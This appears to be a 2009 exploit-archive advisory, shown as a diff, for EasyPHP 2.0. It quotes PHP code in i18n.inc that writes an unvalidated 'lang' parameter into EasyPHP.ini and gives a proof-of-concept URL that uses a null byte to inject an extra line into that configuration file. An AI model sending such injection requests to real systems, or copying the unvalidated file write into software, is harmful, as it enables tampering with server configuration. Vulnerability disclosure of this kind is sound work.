@@ -1,0 +1,41 @@
+
+Bug         : Arbitrary Modify Configuration File
+Vendor      : EasyPHP
+Vendor URI  : http://sourceforge.net/projects/quickeasyphp/
+Product     : EasyPHP 2.0
+Author      : Zigma [zigmatn  @  gmail.com]
+              http://NullArea.NET
+
+Description :
+
+EasyPHP is a WAMP software bundle that installs web server services onto the Windows computer and allows quick-and-easy development of PHP and MySQL on a localhost (also known as 127.0.0.1). 
+The package includes an Apache server, a MySQL database, and the PHP extension.
+
+[+] Analyis :  
+
+A slight look on i18n.inc 
+                   
+if (isset($_GET['lang']) AND $_GET['lang'] != $lang)
+{
+	$fp = fopen($filename, "r");
+	$ini_contents = fread($fp, filesize($filename));
+	fclose($fp);
+	$ini_contents = str_replace("LangAdmin=".$lang, "LangAdmin=".$_GET['lang'], $ini_contents); <--
+	$fp = fopen($filename, "w");
+	fputs($fp,$ini_contents);
+	fclose($fp);
+	Header("Location: " . $_SERVER['PHP_SELF']); 
+	exit;
+}
+
+EasyPHP does not verify user Input ( Lang parameter ) wich leads to arbitrary overwrite EasyPHP configuration file (EasyPHP.ini) .  
+
+[+] Proof Of Concept  :
+
+The request :
+
+http://localhost/index.php?lang=fr%00Lang=Overwritten
+
+Results in overwriting EasyPHP.ini Adding the string "Lang=Overwritten".
+
+# milw0rm.com [2009-05-11]
